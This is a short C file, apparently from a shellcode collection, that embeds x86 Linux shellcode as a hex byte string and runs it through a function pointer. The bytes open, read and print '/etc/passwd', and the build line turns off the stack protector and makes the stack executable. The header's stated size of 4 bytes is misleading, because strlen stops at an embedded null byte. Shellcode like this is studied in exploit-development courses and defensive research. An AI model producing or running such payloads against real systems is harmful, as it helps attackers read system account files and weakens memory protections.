/**
* Filename: readfile_shellcode.c
* Author: h3ll0clar1c3
* Purpose: Read a specified file on the local host  
* Compilation: gcc -fno-stack-protector -z execstack -m32 readfile_shellcode.c -o readfile  
* Usage: ./readfile
* Shellcode size: 4 bytes
* Architecture: x86
**/

#include <stdio.h>
#include <string.h>

unsigned char code[] = \
"\xeb\x36\xb8\x05\x00\x00\x00\x5b\x31\xc9\xcd\x80\x89\xc3\xb8"
"\x03\x00\x00\x00\x89\xe7\x89\xf9\xba\x00\x10\x00\x00\xcd\x80"
"\x89\xc2\xb8\x04\x00\x00\x00\xbb\x01\x00\x00\x00\xcd\x80\xb8"
"\x01\x00\x00\x00\xbb\x00\x00\x00\x00\xcd\x80\xe8\xc5\xff\xff"
"\xff\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64\x00";

int main()
{
        printf("Shellcode length:  %d\n", strlen(code));
        int (*ret)() = (int(*)())code;
        ret();
}
